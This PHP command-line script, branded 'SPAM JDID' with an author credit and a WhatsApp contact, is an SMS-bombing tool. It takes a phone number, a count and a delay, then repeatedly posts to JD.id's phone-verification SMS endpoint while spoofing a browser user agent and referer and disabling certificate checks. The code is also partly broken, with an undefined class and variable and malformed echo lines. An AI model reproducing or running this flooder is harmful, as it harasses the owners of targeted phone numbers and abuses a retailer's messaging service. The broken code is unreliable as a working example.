<?php
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
menu:
system($bersih);
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
$init = new Bom();
echo $green."
____  ____   _    __  __       _ ____ ___ ____
/ ___||  _ \ / \  |  \/  |     | |  _ \_ _|  _ \
\___ \| |_) / _ \ | |\/| |  _  | | | | | || | | |
 ___) |  __/ ___ \| |  | | | |_| | |_| | || |_| |
|____/|_| /_/   \_\_|  |_|  \___/|____/___|____/\n".$yellow.
"Tools Inside Heartz";
echo $blue."
[×•×] Author   : Aditia Alfiansyah
[×•×] WhatsApp : +1(313)2617183
[×•×] github   : github.com/Aditia18\n";
echo "";
echo $red.
echo "<!>Nomor? (ex : 8xxxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo $yellow.
echo "<!>Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
print "DONE ALL SEND\n";
?>
